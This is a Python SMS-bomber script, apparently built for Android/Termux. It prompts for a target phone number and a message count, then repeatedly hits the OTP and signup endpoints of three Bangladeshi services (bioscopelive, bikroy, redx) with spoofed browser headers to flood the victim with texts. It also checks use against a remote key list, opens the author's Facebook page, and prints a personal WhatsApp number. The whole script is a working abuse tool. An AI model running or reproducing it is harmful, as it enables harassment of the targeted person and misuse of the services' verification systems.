import os,requests,time

import os
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')

time.sleep(1)
os.system("clear")
os.system("xdg-open https://www.facebook.com/shahariarzaman.2022")
logo3=("""
\033[1;33m╔═══════════════════════════════════════════════════╗
║        \033[1;32m     WELCOME TO DR4G0N-COBRA-BOMBER            \033[1;33m  ║
╚═══════════════════════════════════════════════════╝
╔══════════════════════[🐍🐍]═══════════════════════╗
\033[1;33m║  \033[1;31m   __________  ____  ____  ____                  \033[1;33m║
\033[1;33m║  \033[1;31m  / ____/ __ \/ __ )/ __ \/   |                  \033[1;33m║
\033[1;33m║   \033[1;31m/ /   / / / / __  / /_/ / /| |                  \033[1;33m║
\033[1;33m║  \033[1;31m/ /___/ /_/ / /_/ / _, _/ ___ |                  \033[1;33m║
\033[1;33m║  \033[1;31m\____/\____/_____/_/ |_/_/  |_|                  \033[1;33m║
\033[1;33m╚═══════════════════════════════════════════════════╝
╔══════════════════[\033[1;32m ADMIN INFO \033[1;33m]═══════════════════╗
║\033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m AUTHOR\033[1;31m    : \033[1;32mDR4G0N                     \033[1;33m ║
║\033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m] \033[1;37mLOVE FROM\033[1;31m : \033[1;32mShahariar Zaman                    \033[1;33m     ║
║\033[1;37m \033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m WHATSAPP\033[1;31m  : \033[1;32m+8801533964445                \033[1;33m    ║
╚═══════════════════════════════════════════════════╝
╔═══════════════════[ NOTICE ]══════════════════════╗
║\033[1;31m ★ THIS TOOLS IS FREE SHARE IT TO YOUR FRIENDS   \033[1;33m  ║
\033[1;33m║ \033[1;31mBUT DONT USE IT FOR DISTURBING PEOPLE.. ENJOY ツ\033[1;33m  ║
╚═══════════════════════════════════════════════════╝
""")

try:
    key1=open("/storage/emulated/0/android8.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/android8.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="Cobra"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)

a=requests.get(" https://github.com/dragon-cyber-team/Approval-Sector/blob/main/approval.txt ").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
    
else:
    os.system("clear")
    print
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/shahariarzaman.2022')
    exit()

print(logo3)
num=input("""  \033[1;31mTARGET NUMBER : +880""")
amount=int(input("\n  \033[1;31mSMS AMOUNT : "))
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  sent1=requests.get(url1,headers=headers1)
  if sent1.status_code==200:
    ses+=1
    print(f"\n{ses} \033[1;32mSMS WAS SENT🐍")
  else:
    pass
  
  sent2=requests.get(url2,headers=headers2)
  if sent2.status_code==200:
    ses+=1
    print(f"\n{ses} \033[1;32mSMS WAS SENT🐍")
  else:
    pass
  
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    ses+=1
    print(f"\n{ses} \033[1;32mSMS WAS SENT🐍")
    
  else:
    pass
os.system("clear")
print(""" \033[1;32m
      ____  ____  _  ________
     / __ \/ __ \/ | / / ____/
    / / / / / / /  |/ / __/   
   / /_/ / /_/ / /|  / /___   
  /_____/\____/_/ |_/_____/   
                            
 THANKS FOR USING OUR TOOLS 🖤
""")